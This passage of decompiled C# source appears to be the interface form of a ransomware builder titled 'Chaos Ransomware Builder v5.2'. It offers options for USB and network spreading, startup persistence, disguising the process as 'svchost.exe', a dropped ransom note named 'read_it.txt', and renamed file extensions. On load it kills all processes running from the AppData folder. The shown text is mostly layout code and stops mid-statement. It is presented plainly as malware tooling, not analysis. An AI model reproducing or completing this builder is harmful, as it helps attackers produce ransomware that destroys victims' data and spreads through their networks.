namespace CustomWindowsForm
{
    using Ryuk.Net;
    using Ryuk.Net.Properties;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Text;
    using System.Windows.Forms;

    public class BlackForm : Form
    {
        private bool isTopPanelDragged = false;
        private bool isLeftPanelDragged = false;
        private bool isRightPanelDragged = false;
        private bool isBottomPanelDragged = false;
        private bool isTopBorderPanelDragged = false;
        private bool isRightBottomPanelDragged = false;
        private bool isLeftBottomPanelDragged = false;
        private bool isRightTopPanelDragged = false;
        private bool isLeftTopPanelDragged = false;
        private bool isWindowMaximized = false;
        private Point offset;
        private Size _normalWindowSize;
        private Point _normalWindowLocation = Point.Empty;
        private string iconLocation = "";
        private IContainer components = null;
        private Panel RightPanel;
        private Panel TopPanel;
        private ButtonZ _CloseButton;
        private Panel RightBottomPanel_1;
        private Label WindowTextLabel;
        private MinMaxButton _MaxButton;
        private Panel panel2;
        private ButtonZ _MinButton;
        private Panel RightBottomPanel_2;
        private Panel LeftBottomPanel_2;
        private Panel RightTopPanel_1;
        private Panel RightTopPanel_2;
        private ShapedButton shapedButton4;
        private CheckBox usbSpreadCheckBox;
        private TextBox textBox1;
        private ShapedButton shapedButton3;
        private SaveFileDialog saveFileDialog1;
        private CheckBox checkBox1;
        private TextBox textBox2;
        private TextBox spreadNameText;
        private CheckBox checkBox2;
        private TextBox textBox4;
        private CheckBox startupcheckBox3;
        private OpenFileDialog openFileDialog1;
        private PictureBox pictureBox1;
        private Label selectIconLabel;
        private CheckBox sleepCheckBox;
        private TextBox SleepTextBox;
        private ShapedButton shapedButton1;
        private TextBox droppedMessageTextbox;
        private Label label1;
        private ShapedButton shapedButton2;

        public BlackForm()
        {
            this.InitializeComponent();
        }

        private void _CloseButton_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void _MaxButton_Click(object sender, EventArgs e)
        {
            if (this.isWindowMaximized)
            {
                base.Location = this._normalWindowLocation;
                base.Size = this._normalWindowSize;
                this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
                this.isWindowMaximized = false;
            }
            else
            {
                this._normalWindowSize = base.Size;
                this._normalWindowLocation = base.Location;
                Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
                base.Location = new Point(0, 0);
                base.Size = new Size(workingArea.Width, workingArea.Height);
                this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
                this.isWindowMaximized = true;
            }
        }

        private void _MinButton_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Minimized;
        }

        private void BlackForm_Load(object sender, EventArgs e)
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.MainModule.FileName.Contains(folderPath))
                    {
                        process.Kill();
                    }
                }
                catch
                {
                }
            }
        }

        private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
        {
            this.isBottomPanelDragged = e.Button == MouseButtons.Left;
        }

        private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.isBottomPanelDragged)
            {
                if (base.Height >= 50)
                {
                    base.Height += e.Y;
                }
                else
                {
                    base.Height = 50;
                    this.isBottomPanelDragged = false;
                }
            }
        }

        private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
        {
            this.isBottomPanelDragged = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            this.textBox2.Enabled = !this.textBox2.Enabled;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            this.textBox4.Enabled = !this.textBox4.Enabled;
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            this.SleepTextBox.Enabled = !this.SleepTextBox.Enabled;
        }

        protected override void Dispose(bool disposing)
        {
            if (!(!disposing || ReferenceEquals(this.components, null)))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void edit_button_Click(object sender, EventArgs e)
        {
        }

        private void file_button_Click(object sender, EventArgs e)
        {
        }

        private void help_button_Click(object sender, EventArgs e)
        {
        }

        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(BlackForm));
            this.RightPanel = new Panel();
            this.TopPanel = new Panel();
            this._MinButton = new ButtonZ();
            this._MaxButton = new MinMaxButton();
            this.WindowTextLabel = new Label();
            this._CloseButton = new ButtonZ();
            this.RightBottomPanel_1 = new Panel();
            this.panel2 = new Panel();
            this.shapedButton2 = new ShapedButton();
            this.label1 = new Label();
            this.droppedMessageTextbox = new TextBox();
            this.shapedButton1 = new ShapedButton();
            this.sleepCheckBox = new CheckBox();
            this.SleepTextBox = new TextBox();
            this.selectIconLabel = new Label();
            this.pictureBox1 = new PictureBox();
            this.startupcheckBox3 = new CheckBox();
            this.textBox4 = new TextBox();
            this.checkBox2 = new CheckBox();
            this.spreadNameText = new TextBox();
            this.checkBox1 = new CheckBox();
            this.textBox2 = new TextBox();
            this.usbSpreadCheckBox = new CheckBox();
            this.shapedButton4 = new ShapedButton();
            this.shapedButton3 = new ShapedButton();
            this.RightBottomPanel_2 = new Panel();
            this.LeftBottomPanel_2 = new Panel();
            this.RightTopPanel_1 = new Panel();
            this.RightTopPanel_2 = new Panel();
            this.textBox1 = new TextBox();
            this.saveFileDialog1 = new SaveFileDialog();
            this.openFileDialog1 = new OpenFileDialog();
            this.TopPanel.SuspendLayout();
            this.panel2.SuspendLayout();
            ((ISupportInitialize) this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.RightPanel.Anchor = AnchorStyles.Right | AnchorStyles.Bottom | AnchorStyles.Top;
            this.RightPanel.BackColor = Color.Black;
            this.RightPanel.Cursor = Cursors.SizeWE;
            this.RightPanel.Location = new Point(0x380, 0x16);
            this.RightPanel.Name = "RightPanel";
            this.RightPanel.Size = new Size(2, 0x1d4);
            this.RightPanel.TabIndex = 1;
            this.RightPanel.MouseDown += new MouseEventHandler(this.RightPanel_MouseDown);
            this.RightPanel.MouseMove += new MouseEventHandler(this.RightPanel_MouseMove);
            this.RightPanel.MouseUp += new MouseEventHandler(this.RightPanel_MouseUp);
            this.TopPanel.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
            this.TopPanel.BackColor = Color.FromArgb(30, 30, 30);
            this.TopPanel.Controls.Add(this._MinButton);
            this.TopPanel.Controls.Add(this._MaxButton);
            this.TopPanel.Controls.Add(this.WindowTextLabel);
            this.TopPanel.Controls.Add(this._CloseButton);
            this.TopPanel.Location = new Point(0, 0);
            this.TopPanel.Name = "TopPanel";
            this.TopPanel.Size = new Size(0x34d, 0x4a);
            this.TopPanel.TabIndex = 4;
            this.TopPanel.Paint += new PaintEventHandler(this.TopPanel_Paint);
            this.TopPanel.MouseDown += new MouseEventHandler(this.TopPanel_MouseDown);
            this.TopPanel.MouseMove += new MouseEventHandler(this.TopPanel_MouseMove);
            this.TopPanel.MouseUp += new MouseEventHandler(this.TopPanel_MouseUp);
            this._MinButton.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this._MinButton.BZBackColor = Color.FromArgb(30, 30, 30);
            this._MinButton.DisplayText = "_";
            this._MinButton.FlatStyle = FlatStyle.Flat;
            this._MinButton.Font = new Font("Microsoft Sans Serif", 20.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this._MinButton.ForeColor = Color.White;
            this._MinButton.Location = new Point(0x2e1, 8);
            this._MinButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
            this._MinButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
            this._MinButton.Name = "_MinButton";
            this._MinButton.Size = new Size(0x1f, 0x18);
            this._MinButton.TabIndex = 4;
            this._MinButton.Text = "_";
            this._MinButton.TextLocation_X = 6;
            this._MinButton.TextLocation_Y = -20;
            this._MinButton.UseVisualStyleBackColor = true;
            this._MinButton.Click += new EventHandler(this._MinButton_Click);
            this._MaxButton.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this._MaxButton.BZBackColor = Color.FromArgb(30, 30, 30);
            this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
            this._MaxButton.DisplayText = "_";
            this._MaxButton.FlatStyle = FlatStyle.Flat;
            this._MaxButton.ForeColor = Color.White;
            this._MaxButton.Location = new Point(0x306, 9);
            this._MaxButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
            this._MaxButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
            this._MaxButton.Name = "_MaxButton";
            this._MaxButton.Size = new Size(0x1f, 0x18);
            this._MaxButton.TabIndex = 2;
            this._MaxButton.Text = "minMaxButton1";
            this._MaxButton.TextLocation_X = 8;
            this._MaxButton.TextLocation_Y = 6;
            this._MaxButton.UseVisualStyleBackColor = true;
            this._MaxButton.Click += new EventHandler(this._MaxButton_Click);
            this.WindowTextLabel.AutoSize = true;
            this.WindowTextLabel.Font = new Font("Microsoft Sans Serif", 26.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.WindowTextLabel.ForeColor = Color.White;
            this.WindowTextLabel.Location = new Point(8, 0x16);
            this.WindowTextLabel.Name = "WindowTextLabel";
            this.WindowTextLabel.Size = new Size(0x20b, 0x27);
            this.WindowTextLabel.TabIndex = 1;
            this.WindowTextLabel.Text = "Chaos Ransomware Builder v5.2";
            this.WindowTextLabel.MouseDown += new MouseEventHandler(this.WindowTextLabel_MouseDown);
            this.WindowTextLabel.MouseMove += new MouseEventHandler(this.WindowTextLabel_MouseMove);
            this.WindowTextLabel.MouseUp += new MouseEventHandler(this.WindowTextLabel_MouseUp);
            this._CloseButton.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this._CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
            this._CloseButton.DisplayText = "X";
            this._CloseButton.FlatStyle = FlatStyle.Flat;
            this._CloseButton.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this._CloseButton.ForeColor = Color.White;
            this._CloseButton.Location = new Point(0x32b, 8);
            this._CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
            this._CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
            this._CloseButton.Name = "_CloseButton";
            this._CloseButton.Size = new Size(0x1f, 0x18);
            this._CloseButton.TabIndex = 0;
            this._CloseButton.Text = "X";
            this._CloseButton.TextLocation_X = 6;
            this._CloseButton.TextLocation_Y = 1;
            this._CloseButton.UseVisualStyleBackColor = true;
            this._CloseButton.Click += new EventHandler(this._CloseButton_Click);
            this.RightBottomPanel_1.Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
            this.RightBottomPanel_1.BackColor = Color.Black;
            this.RightBottomPanel_1.Cursor = Cursors.SizeNWSE;
            this.RightBottomPanel_1.Location = new Point(0x36e, 0x1fd);
            this.RightBottomPanel_1.Name = "RightBottomPanel_1";
            this.RightBottomPanel_1.Size = new Size(0x13, 2);
            this.RightBottomPanel_1.TabIndex = 5;
            this.RightBottomPanel_1.MouseDown += new MouseEventHandler(this.RightBottomPanel_1_MouseDown);
            this.RightBottomPanel_1.MouseMove += new MouseEventHandler(this.RightBottomPanel_1_MouseMove);
            this.RightBottomPanel_1.MouseUp += new MouseEventHandler(this.RightBottomPanel_1_MouseUp);
            this.panel2.BackColor = Color.FromArgb(30, 30, 30);
            this.panel2.Controls.Add(this.shapedButton2);
            this.panel2.Controls.Add(this.label1);
            this.panel2.Controls.Add(this.droppedMessageTextbox);
            this.panel2.Controls.Add(this.shapedButton1);
            this.panel2.Controls.Add(this.sleepCheckBox);
            this.panel2.Controls.Add(this.SleepTextBox);
            this.panel2.Controls.Add(this.selectIconLabel);
            this.panel2.Controls.Add(this.pictureBox1);
            this.panel2.Controls.Add(this.startupcheckBox3);
            this.panel2.Controls.Add(this.textBox4);
            this.panel2.Controls.Add(this.checkBox2);
            this.panel2.Controls.Add(this.spreadNameText);
            this.panel2.Controls.Add(this.checkBox1);
            this.panel2.Controls.Add(this.textBox2);
            this.panel2.Controls.Add(this.usbSpreadCheckBox);
            this.panel2.Controls.Add(this.shapedButton4);
            this.panel2.Controls.Add(this.shapedButton3);
            this.panel2.Dock = DockStyle.Bottom;
            this.panel2.ForeColor = SystemColors.Control;
            this.panel2.Location = new Point(0, 0x18e);
            this.panel2.Name = "panel2";
            this.panel2.Size = new Size(0x34f, 0x92);
            this.panel2.TabIndex = 8;
            this.panel2.Paint += new PaintEventHandler(this.panel2_Paint);
            this.shapedButton2.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.shapedButton2.BackColor = Color.Transparent;
            this.shapedButton2.BorderColor = Color.Transparent;
            this.shapedButton2.BorderWidth = 2;
            this.shapedButton2.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
            this.shapedButton2.ButtonText = "FileExtensions";
            this.shapedButton2.Cursor = Cursors.Hand;
            this.shapedButton2.EndColor = Color.FromArgb(30, 30, 30);
            this.shapedButton2.FlatAppearance.BorderSize = 0;
            this.shapedButton2.FlatAppearance.MouseDownBackColor = Color.Transparent;
            this.shapedButton2.FlatAppearance.MouseOverBackColor = Color.Transparent;
            this.shapedButton2.FlatStyle = FlatStyle.Flat;
            this.shapedButton2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.shapedButton2.ForeColor = Color.White;
            this.shapedButton2.GradientAngle = 90;
            this.shapedButton2.Location = new Point(0, 0x52);
            this.shapedButton2.MouseClickColor1 = Color.Black;
            this.shapedButton2.MouseClickColor2 = Color.Black;
            this.shapedButton2.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
            this.shapedButton2.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
            this.shapedButton2.Name = "shapedButton2";
            this.shapedButton2.ShowButtontext = true;
            this.shapedButton2.Size = new Size(0xa6, 0x37);
            this.shapedButton2.StartColor = Color.FromArgb(30, 30, 30);
            this.shapedButton2.TabIndex = 0x1b;
            this.shapedButton2.TextLocation_X = 30;
            this.shapedButton2.TextLocation_Y = 0x13;
            this.shapedButton2.Transparent1 = 250;
            this.shapedButton2.Transparent2 = 250;
            this.shapedButton2.UseVisualStyleBackColor = false;
            this.shapedButton2.Click += new EventHandler(this.shapedButton2_Click);
            this.label1.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.label1.AutoSize = true;
            this.label1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label1.Location = new Point(0x20a, 0x11);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x73, 15);
            this.label1.TabIndex = 0x1a;
            this.label1.Text = "Dropped File Name";
            this.droppedMessageTextbox.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.droppedMessageTextbox.BackColor = Color.FromArgb(30, 30, 30);
            this.droppedMessageTextbox.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.droppedMessageTextbox.ForeColor = SystemColors.Window;
            this.droppedMessageTextbox.Location = new Point(0x20d, 40);
            this.droppedMessageTextbox.Name = "droppedMessageTextbox";
            this.droppedMessageTextbox.Size = new Size(0x8f, 0x16);
            this.droppedMessageTextbox.TabIndex = 0x19;
            this.droppedMessageTextbox.Text = "read_it.txt";
            this.droppedMessageTextbox.TextAlign = HorizontalAlignment.Center;
            this.shapedButton1.BackColor = Color.Transparent;
            this.shapedButton1.BorderColor = Color.Transparent;
            this.shapedButton1.BorderWidth = 2;
            this.shapedButton1.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
            this.shapedButton1.ButtonText = "Advanced Options";
            this.shapedButton1.Cursor = Cursors.Hand;
            this.shapedButton1.EndColor = Color.FromArgb(30, 30, 30);
            this.shapedButton1.FlatAppearance.BorderSize = 0;
            this.shapedButton1.FlatAppearance.MouseDownBackColor = Color.Transparent;
            this.shapedButton1.FlatAppearance.MouseOverBackColor = Color.Transparent;
            this.shapedButton1.FlatStyle = FlatStyle.Flat;
            this.shapedButton1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.shapedButton1.ForeColor = Color.White;
            this.shapedButton1.GradientAngle = 80;
            this.shapedButton1.Location = new Point(0xaf, 0x52);
            this.shapedButton1.MouseClickColor1 = Color.Black;
            this.shapedButton1.MouseClickColor2 = Color.Black;
            this.shapedButton1.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
            this.shapedButton1.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
            this.shapedButton1.Name = "shapedButton1";
            this.shapedButton1.ShowButtontext = true;
            this.shapedButton1.Size = new Size(0xa6, 0x37);
            this.shapedButton1.StartColor = Color.FromArgb(30, 30, 30);
            this.shapedButton1.TabIndex = 0x17;
            this.shapedButton1.TextLocation_X = 0x10;
            this.shapedButton1.TextLocation_Y = 20;
            this.shapedButton1.Transparent1 = 200;
            this.shapedButton1.Transparent2 = 200;
            this.shapedButton1.UseVisualStyleBackColor = false;
            this.shapedButton1.Click += new EventHandler(this.shapedButton1_Click);
            this.sleepCheckBox.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.sleepCheckBox.AutoSize = true;
            this.sleepCheckBox.Cursor = Cursors.Hand;
            this.sleepCheckBox.Location = new Point(0x167, 0x51);
            this.sleepCheckBox.Name = "sleepCheckBox";
            this.sleepCheckBox.Size = new Size(0x5b, 0x11);
            this.sleepCheckBox.TabIndex = 0x16;
            this.sleepCheckBox.Text = "Delay second";
            this.sleepCheckBox.UseVisualStyleBackColor = true;
            this.sleepCheckBox.CheckedChanged += new EventHandler(this.checkBox3_CheckedChanged);
            this.SleepTextBox.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.SleepTextBox.BackColor = Color.FromArgb(30, 30, 30);
            this.SleepTextBox.Enabled = false;
            this.SleepTextBox.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.SleepTextBox.ForeColor = SystemColors.Window;
            this.SleepTextBox.Location = new Point(0x167, 0x6b);
            this.SleepTextBox.Name = "SleepTextBox";
            this.SleepTextBox.Size = new Size(0x5b, 0x16);
            this.SleepTextBox.TabIndex = 0x15;
            this.SleepTextBox.Text = "10";
            this.SleepTextBox.TextAlign = HorizontalAlignment.Center;
            this.SleepTextBox.KeyPress += new KeyPressEventHandler(this.SleepTextBox_KeyPress_1);
            this.selectIconLabel.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.selectIconLabel.AutoSize = true;
            this.selectIconLabel.Cursor = Cursors.Hand;
            this.selectIconLabel.Location = new Point(0x251, 0x5d);
            this.selectIconLabel.Name = "selectIconLabel";
            this.selectIconLabel.Size = new Size(0x3d, 13);
            this.selectIconLabel.TabIndex = 20;
            this.selectIconLabel.Text = "Select Icon";
            this.selectIconLabel.Click += new EventHandler(this.selectIconLabel_Click);
            this.pictureBox1.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.pictureBox1.BorderStyle = BorderStyle.FixedSingle;
            this.pictureBox1.Cursor = Cursors.Hand;
            this.pictureBox1.Location = new Point(0x243, 0x44);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(0x59, 0x45);
            this.pictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;
            this.pictureBox1.TabIndex = 0x12;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Click += new EventHandler(this.pictureBox1_Click);
            this.startupcheckBox3.AutoSize = true;
            this.startupcheckBox3.Checked = true;
            this.startupcheckBox3.CheckState = CheckState.Checked;
            this.startupcheckBox3.Cursor = Cursors.Hand;
            this.startupcheckBox3.Location = new Point(470, 0x52);
            this.startupcheckBox3.Name = "startupcheckBox3";
            this.startupcheckBox3.Size = new Size(0x5c, 0x11);
            this.startupcheckBox3.TabIndex = 15;
            this.startupcheckBox3.Text = "Add to startup";
            this.startupcheckBox3.UseVisualStyleBackColor = true;
            this.textBox4.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.textBox4.BackColor = Color.FromArgb(30, 30, 30);
            this.textBox4.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.textBox4.ForeColor = SystemColors.Window;
            this.textBox4.Location = new Point(0x167, 40);
            this.textBox4.Name = "textBox4";
            this.textBox4.Size = new Size(0x8f, 0x16);
            this.textBox4.TabIndex = 14;
            this.textBox4.Text = "svchost.exe";
            this.textBox4.TextAlign = HorizontalAlignment.Center;
            this.checkBox2.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.checkBox2.AutoSize = true;
            this.checkBox2.Checked = true;
            this.checkBox2.CheckState = CheckState.Checked;
            this.checkBox2.Cursor = Cursors.Hand;
            this.checkBox2.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.checkBox2.Location = new Point(0x167, 0x11);
            this.checkBox2.Name = "checkBox2";
            this.checkBox2.Size = new Size(0x68, 0x11);
            this.checkBox2.TabIndex = 13;
            this.checkBox2.Text = "Proccess Name:";
            this.checkBox2.UseVisualStyleBackColor = true;
            this.checkBox2.CheckedChanged += new EventHandler(this.checkBox2_CheckedChanged);
            this.spreadNameText.BackColor = Color.FromArgb(30, 30, 30);
            this.spreadNameText.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.spreadNameText.ForeColor = SystemColors.Window;
            this.spreadNameText.Location = new Point(190, 40);
            this.spreadNameText.Name = "spreadNameText";
            this.spreadNameText.Size = new Size(0x8f, 0x16);
            this.spreadNameText.TabIndex = 12;
            this.spreadNameText.Text = "surprise";
            this.spreadNameText.TextAlign = HorizontalAlignment.Center;
            this.checkBox1.AutoSize = true;
            this.checkBox1.Checked = true;
            this.checkBox1.CheckState = CheckState.Checked;
            this.checkBox1.Cursor = Cursors.Hand;
            this.checkBox1.Location = new Point(20, 14);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new Size(0x92, 0x11);
            this.checkBox1.TabIndex = 11;
            this.checkBox1.Text = "Randomize file extension:";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new EventHandler(this.checkBox1_CheckedChanged);
            this.textBox2.BackColor = Color.FromArgb(30, 30, 30);
            this.textBox2.Enabled = false;
            this.textBox2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.textBox2.ForeColor = SystemColors.Window;
            this.textBox2.Location = new Point(20, 40);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(0x8f, 0x16);
            this.textBox2.TabIndex = 10;
            this.textBox2.Text = "encrypted";
            this.textBox2.TextAlign = HorizontalAlignment.Center;
            this.usbSpreadCheckBox.AutoSize = true;
            this.usbSpreadCheckBox.Checked = true;
            this.usbSpreadCheckBox.CheckState = CheckState.Checked;
            this.usbSpreadCheckBox.Cursor = Cursors.Hand;
            this.usbSpreadCheckBox.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.usbSpreadCheckBox.Location = new Point(0xc1, 14);
            this.usbSpreadCheckBox.Name = "usbSpreadCheckBox";
            this.usbSpreadCheckBox.Size = new Size(0x91, 0x11);
            this.usbSpreadCheckBox.TabIndex = 9;
            this.usbSpreadCheckBox.Text = "Usb and network spread:";
            this.usbSpreadCheckBox.UseVisualStyleBackColor = true;
            this.usbSpreadCheckBox.CheckedChanged += new EventHandler(this.usbSpreadCheckBox_CheckedChanged);
            this.shapedButton4.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.shapedButton4.BackColor = Color.Transparent;
            this.shapedButton4.BorderColor = Color.Transparent;
            this.shapedButton4.BorderWidth = 2;
            this.shapedButton4.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
            this.shapedButton4.ButtonText = "Build ";
            this.shapedButton4.Cursor = Cursors.Hand;
            this.shapedButton4.EndColor = Color.FromArgb(30, 30, 30);
            this.shapedButton4.FlatAppearance.BorderSize = 0;
            this.shapedButton4.FlatAppearance.MouseDownBackColor = Color.Transparent;
            this.shapedButton4.FlatAppearance.MouseOverBackColor = Color.Transparent;
            this.shapedButton4.FlatStyle = FlatStyle.Flat;
            this.shapedButton4.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.shapedButton4.ForeColor = Color.White;
            this.shapedButton4.GradientAngle = 90;
            this.shapedButton4.Location = new Point(0x2bb, 0x4f);
            this.shapedButton4.MouseClickColor1 = Color.Black;
            this.shapedButton4.MouseClickColor2 = Color.Black;
            this.shapedButton4.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
            this.shapedButton4.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
            this.shapedButton4.Name = "shapedButton4";
            this.shapedButton4.ShowButtontext = true;
            this.shapedButton4.Size = new Size(0x88, 0x37);
            this.shapedButton4.StartColor = Color.FromArgb(30, 30, 30);
            this.shapedButton4.TabIndex = 8;
            this.shapedButton4.TextLocation_X = 0x2e;
            this.shapedButton4.TextLocation_Y = 0x12;
            this.shapedButton4.Transparent1 = 250;
            this.shapedButton4.Transparent2 = 250;
            this.shapedButton4.UseVisualStyleBackColor = false;
            this.shapedButton4.Click += new EventHandler(this.shapedButton4_Click);
            this.shapedButton3.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.shapedButton3.BackColor = Color.Transparent;
            this.shapedButton3.BorderColor = Color.Transparent;
            this.shapedButton3.BorderWidth = 2;
            this.shapedButton3.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
            this.shapedButton3.ButtonText = "About";
            this.shapedButton3.Cursor = Cursors.Hand;
            this.shapedButton3.EndColor = Color.FromArgb(30, 30, 30);
            this.shapedButton3.FlatAppearance.BorderSize = 0;
            this.shapedButton3.FlatAppearance.MouseDownBackColor = Color.Transparent;
            this.shapedButton3.FlatAppearance.MouseOverBackColor = Color.Transparent;
            this.shapedButton3.FlatStyle = FlatStyle.Flat;
            this.shapedButton3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.shapedButton3.ForeColor = Color.White;
            this.shapedButton3.GradientAngle = 90;
            this.shapedButton3.Location = new Point(0x2bb, 0x12);
            this.shapedButton3.MouseClickColor1 = Color.Black;
            this.shapedButton3.MouseClickColor2 = Color.Black;
            this.shapedButton3.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
            this.shapedButton3.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
            this.shapedButton3.Name = "shapedButton3";
            this.shapedButton3.ShowButtontext = true;
            this.shapedButton3.Size = new Size(0x88, 0x37);
            this.shapedButton3.StartColor = Color.FromArgb(30, 30, 30);
            this.shapedButton3.TabIndex = 7;
            this.shapedButton3.TextLocation_X = 0x2d;
            this.shapedButton3.TextLocation_Y = 0x12;
            this.shapedButton3.Transparent1 = 250;
            this.shapedButton3.Transparent2 = 250;
            this.shapedButton3.UseVisualStyleBackColor = false;
            this.shapedButton3.Click += new EventHandler(this.shapedButton3_Click);
            this.RightBottomPanel_2.Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
            this.RightBottomPanel_2.BackColor = Color.Black;
            this.RightBottomPanel_2.Cursor = Cursors.SizeNWSE;
            this.RightBottomPanel_2.Location = new Point(0x380, 490);
            this.RightBottomPanel_2.Name = "RightBottomPanel_2";
            this.RightBottomPanel_2.Size = new Size(2, 0x13);
            this.RightBottomPanel_2.TabIndex = 9;
            this.RightBottomPanel_2.MouseDown += new MouseEventHandler(this.RightBottomPanel_2_MouseDown);
            this.RightBottomPanel_2.MouseMove += new MouseEventHandler(this.RightBottomPanel_2_MouseMove);
            this.RightBottomPanel_2.MouseUp += new MouseEventHandler(this.RightBottomPanel_2_MouseUp);
            this.LeftBottomPanel_2.Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
            this.LeftBottomPanel_2.BackColor = Color.Black;
            this.LeftBottomPanel_2.Cursor = Cursors.SizeNESW;
            this.LeftBottomPanel_2.Location = new Point(0, 0x1eb);
            this.LeftBottomPanel_2.Name = "LeftBottomPanel_2";
            this.LeftBottomPanel_2.Size = new Size(2, 0x13);
            this.LeftBottomPanel_2.TabIndex = 11;
            this.LeftBottomPanel_2.MouseDown += new MouseEventHandler(this.LeftBottomPanel_2_MouseDown);
            this.LeftBottomPanel_2.MouseMove += new MouseEventHandler(this.LeftBottomPanel_2_MouseMove);
            this.LeftBottomPanel_2.MouseUp += new MouseEventHandler(this.LeftBottomPanel_2_MouseUp);
            this.RightTopPanel_1.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.RightTopPanel_1.BackColor = Color.Black;
            this.RightTopPanel_1.Cursor = Cursors.SizeNESW;
            this.RightTopPanel_1.Location = new Point(0x380, 2);
            this.RightTopPanel_1.Name = "RightTopPanel_1";
            this.RightTopPanel_1.Size = new Size(2, 20);
            this.RightTopPanel_1.TabIndex = 12;
            this.RightTopPanel_1.MouseDown += new MouseEventHandler(this.RightTopPanel_1_MouseDown);
            this.RightTopPanel_1.MouseMove += new MouseEventHandler(this.RightTopPanel_1_MouseMove);
            this.RightTopPanel_1.MouseUp += new MouseEventHandler(this.RightTopPanel_1_MouseUp);
            this.RightTopPanel_2.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.RightTopPanel_2.BackColor = Color.Black;
            this.RightTopPanel_2.Cursor = Cursors.SizeNESW;
            this.RightTopPanel_2.Location = new Point(0x36e, 0);
            this.RightTopPanel_2.Name = "RightTopPanel_2";
            this.RightTopPanel_2.Size = new Size(20, 2);
            this.RightTopPanel_2.TabIndex = 13;
            this.RightTopPanel_2.MouseDown += new MouseEventHandler(this.RightTopPanel_2_MouseDown);
